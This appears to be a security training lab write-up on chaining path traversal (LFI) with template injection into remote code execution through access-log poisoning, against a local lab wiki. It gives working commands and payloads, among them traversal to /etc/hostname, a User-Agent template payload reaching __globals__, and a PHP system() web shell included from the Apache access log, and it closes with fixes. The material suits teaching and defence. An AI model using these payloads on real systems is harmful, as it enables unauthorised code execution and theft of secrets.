# Lab 29 — Wiki

## Two bugs that are only interesting together

```python
raw = (ROOT / "pages" / name).read_text()   # 1. no containment check
return text(render(raw, {...}))             # 2. read as a template
```

Alone, (1) is a file read: useful, limited to files that exist and contain
something worth having. Alone, (2) is nothing, because you cannot supply a
template.

Together they are **remote code execution**, because you can write into a file
the server keeps on your behalf and then ask it to render that file.

## Step 1 — confirm the traversal and learn the layout

```bash
h5i browser open 'http://127.0.0.1:9290/view?page=home.md' --session lab29 --new --capture
h5i websec replay req_0 --session lab29 --set query.page=nope
```

```json
{"error":"FileNotFoundError","asked_for":"/tmp/lab29-abc/pages/nope"}
```

The error names the base directory. One `../` reaches its parent, which is
where the application keeps `access.log`.

Confirm the traversal itself before building anything:

```bash
h5i websec replay req_0 --session lab29 --set query.page=../access.log
h5i websec replay req_0 --session lab29 --set query.page=../../../etc/hostname
```

## Step 2 — write into a file you do not own

Every request is logged, `User-Agent` included. That header is a **write
primitive**: whatever you put in it, the server appends to a file, verbatim.

```bash
h5i websec replay req_0 --session lab29 \
    --set 'header.User-Agent={{page.__init__.__globals__["RELEASE_KEY"]}}'
```

Other sinks that store attacker text and are later read back:

* access and error logs (`User-Agent`, `Referer`, the request line, the
  username in a failed login)
* mail logs, via an SMTP `RCPT TO`
* `/proc/self/environ` — the environment, where a header sometimes lands
* session files (a PHP session whose contents you influence)
* a database column the app later interpolates (which is Lab 19's shape)
* upload directories (Lab 28)

## Step 3 — include it

```bash
h5i websec replay req_0 --session lab29 --set 'query.page=../access.log'
```

The log is read as a template, and the `{{ … }}` line you wrote is evaluated.
The escape from the restricted namespace is Lab 17's ladder: reach an object,
climb to its `__globals__`, come back down to the value or to `os`.

On a PHP target, the same chain with `<?php system($_GET['c']); ?>` in the
`User-Agent` and `?page=../../var/log/apache2/access.log&c=id` is the version
you will actually meet in the wild.

## Reading the chain

State it as a sentence, because that sentence is the finding:

> An unauthenticated request can write chosen bytes into a server-side file
> (log poisoning), and an unauthenticated request can cause any file to be read
> and evaluated as a template (LFI plus SSTI). Together they give code execution
> as the service account.

Neither half would be reported at that severity alone. **Look for the second
half.** That habit is most of what separates a scanner's output from an
engagement report.

## The fix

* Resolve and contain: `target.resolve().is_relative_to(base.resolve())`, or
  better, look pages up by id in a map and never build a path.
* Do not render stored content as a template. If pages must be templates, they
  are code — treat editing them as a privileged operation, and render them in a
  sandbox with no object graph reachable (Lab 17).
* Keep logs outside any directory the application reads from, and never make
  log contents reachable by an application code path.

## h5i technique

Using a request **header** as a write primitive with `--set header.User-Agent=`
— it is easy to forget that a header is attacker input with a persistence
side effect.
